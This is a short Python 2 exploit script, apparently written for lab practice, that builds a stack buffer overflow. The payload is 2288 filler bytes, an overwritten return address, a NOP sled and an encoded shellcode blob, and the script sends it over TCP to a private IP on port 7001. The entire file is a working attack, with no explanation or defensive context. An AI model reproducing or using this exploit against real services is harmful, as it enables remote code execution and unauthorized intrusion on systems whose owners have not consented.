#!/usr/bin/python
import socket

shellcode = ("\xd9\xce\xd9\x74\x24\xf4\xbb\xfb\x41\xe4\x34\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x11\xbd\x06\xc1\x19\xd6\x45"
"\x2a\xe1\x27\x2a\xa2\x04\x16\x6a\xd0\x4d\x09\x5a\x92\x03\xa6"
"\x11\xf6\xb7\x3d\x57\xdf\xb8\xf6\xd2\x39\xf7\x07\x4e\x79\x96"
"\x8b\x8d\xae\x78\xb5\x5d\xa3\x79\xf2\x80\x4e\x2b\xab\xcf\xfd"
"\xdb\xd8\x9a\x3d\x50\x92\x0b\x46\x85\x63\x2d\x67\x18\xff\x74"
"\xa7\x9b\x2c\x0d\xee\x83\x31\x28\xb8\x38\x81\xc6\x3b\xe8\xdb"
"\x27\x97\xd5\xd3\xd5\xe9\x12\xd3\x05\x9c\x6a\x27\xbb\xa7\xa9"
"\x55\x67\x2d\x29\xfd\xec\x95\x95\xff\x21\x43\x5e\xf3\x8e\x07"
"\x38\x10\x10\xcb\x33\x2c\x99\xea\x93\xa4\xd9\xc8\x37\xec\xba"
"\x71\x6e\x48\x6c\x8d\x70\x33\xd1\x2b\xfb\xde\x06\x46\xa6\xb6"
"\xeb\x6b\x58\x47\x64\xfb\x2b\x75\x2b\x57\xa3\x35\xa4\x71\x34"
"\x39\x9f\xc6\xaa\xc4\x20\x37\xe3\x02\x74\x67\x9b\xa3\xf5\xec"
"\x5b\x4b\x20\xa2\x0b\xe3\x9b\x03\xfb\x43\x4c\xec\x11\x4c\xb3"
"\x0c\x1a\x86\xdc\xa7\xe1\x41\x23\x9f\x9e\x47\xcb\xe2\x60\x69"
"\xb7\x6a\x86\x03\xd7\x3a\x11\xbc\x4e\x67\xe9\x5d\x8e\xbd\x94"
"\x5e\x04\x32\x69\x10\xed\x3f\x79\xc5\x1d\x0a\x23\x40\x21\xa0"
"\x4b\x0e\xb0\x2f\x8b\x59\xa9\xe7\xdc\x0e\x1f\xfe\x88\xa2\x06"
"\xa8\xae\x3e\xde\x93\x6a\xe5\x23\x1d\x73\x68\x1f\x39\x63\xb4"
"\xa0\x05\xd7\x68\xf7\xd3\x81\xce\xa1\x95\x7b\x99\x1e\x7c\xeb"
"\x5c\x6d\xbf\x6d\x61\xb8\x49\x91\xd0\x15\x0c\xae\xdd\xf1\x98"
"\xd7\x03\x62\x66\x02\x80\x92\x2d\x0e\xa1\x3a\xe8\xdb\xf3\x26"
"\x0b\x36\x37\x5f\x88\xb2\xc8\xa4\x90\xb7\xcd\xe1\x16\x24\xbc"
"\x7a\xf3\x4a\x13\x7a\xd6")

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "\xcf\x10\x80\x14" # \x148010cf
  offset    = "C" * 8
  nops      = "\x90" * 16

  inputBuffer = filler + eip + offset + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"

